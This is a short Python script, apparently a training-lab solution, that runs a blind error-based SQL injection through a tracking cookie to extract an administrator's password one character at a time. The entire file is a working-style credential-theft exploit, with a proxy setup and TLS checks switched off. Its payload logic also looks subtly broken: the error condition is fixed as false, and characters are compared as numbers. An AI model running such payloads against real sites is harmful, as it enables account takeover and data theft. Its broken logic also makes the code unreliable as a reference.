import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}

def sqli_password(url):
	password_extracted = ""
	for i in range(1,21):
		for j in range(32,126):
			sql_payload = "' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') and substr(password,%s,1)='%s' ||'" %(i,j)
			sql_payload_encoded =urllib.parse.quote(sql_payload)
			cookies = {'TrackingId':'QE0hiDyKLeDlZtmp' +sql_payload_encoded, 'session':'RSJVLwc1dh6jX9LSy3dUfHWJR098R4lI'}
			r = requests.get(url,cookies=cookies,verify=False,proxies=proxies)
			if r.status_code ==500:
				password_extracted += chr(j)
				sys.stdout.write('\r'+password_extracted)
				sys.stdout.flush()
				break
			else:
				sys.stdout.write('\r'+password_extracted+chr(j))
				sys.stdout.flush()	


def main():
	if len(sys.argv) !=2:
		print("(+) Usage: %s <url>" %sys.argv[0])
		print("(+) Example: %s www.example.com" %sys.argv[0])
		sys.exit(-1)

	url = sys.argv[1]
	print("(+) Retriving administrator password.....")
	sqli_password(url)	


if __name__ == '__main__':
	main()